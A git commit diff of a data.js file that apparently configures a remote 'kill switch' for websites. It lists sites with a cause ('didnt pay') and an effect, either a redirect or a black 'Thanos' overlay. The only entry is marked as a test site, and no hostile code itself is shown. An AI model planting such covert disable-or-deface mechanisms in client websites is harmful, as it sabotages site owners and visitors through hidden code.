09a6ae7946e11cf970e6cf6e9b50860ecf55b6d1
Daniel <72696191+deusnotam@users.noreply.github.com>
2024-02-15 17:53:47 +0100

    Update data.js

--- data.js
+++ data.js
@@ -5,10 +5,14 @@
  * by Deus Notam
  * Telegram Channel → https://t.me/deusnotam
  * Telegram Group → https://t.me/d3usn0tam
- * Доступные Эффекты:
+ * Доступные причины:
+ * didnt pay - не оплата работы
+ * Доступные эффекты:
  * redirect - редирект на redirecturl
  * thanos - поверх сайта чёрный экран с gif щелком таноса
  */
 var data = [
     { name: "ABROS", url: "https://abros.me", date: "09/01/2022", cause: "didnt pay", effect: "thanos", redirecturl: "-", note: "Это сайт для тестов, с ним ничего не происходит." },
 ];
+
+export { data };
